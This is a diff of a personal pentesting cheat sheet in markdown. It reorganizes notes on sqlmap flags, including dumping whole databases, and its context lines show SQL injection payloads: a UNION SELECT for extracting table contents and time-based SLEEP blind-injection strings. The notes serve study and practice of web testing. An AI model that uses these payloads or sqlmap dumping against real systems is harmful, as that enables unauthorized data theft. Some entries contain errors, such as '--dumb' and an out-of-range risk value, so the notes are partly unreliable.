@@ -204,14 +204,20 @@ Find content: '+UNION+SELECT+colum1,+column2,+FROM+discovered_table--
 - sqlmap
   - -u = url
   - --data="id=123&password=123"
-  - --level= ??
-  - --risk= ??
+  - --level 2  
+  - --risk 5
   - --dbms=type of db
   - --technique=???
   - --dumb = output_database
   - --dbms=DATA_BASE_TYPE
-  - -r = file
+  - -r /path/to/file
+
+- Table found:
   - --method=METHOD
+  - -D Database_Name
+  - --tables / -T
+  - --columns
+  - --dump-all
 
 ##### Provoking errors
 - Oracle
@@ -252,14 +258,8 @@ Find content: '+UNION+SELECT+colum1,+column2,+FROM+discovered_table--
 admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
 admin123' UNION SELECT SLEEP(5),2;--
 
-### SQLMAP
-- -r /path/to/file
-- --level 2  
-- --risk 5
-- -D Database_Name
-- --tables / -T
-- --columns
-- --dump-all
+
+
 # Burpsuite
 
 ## Repeater
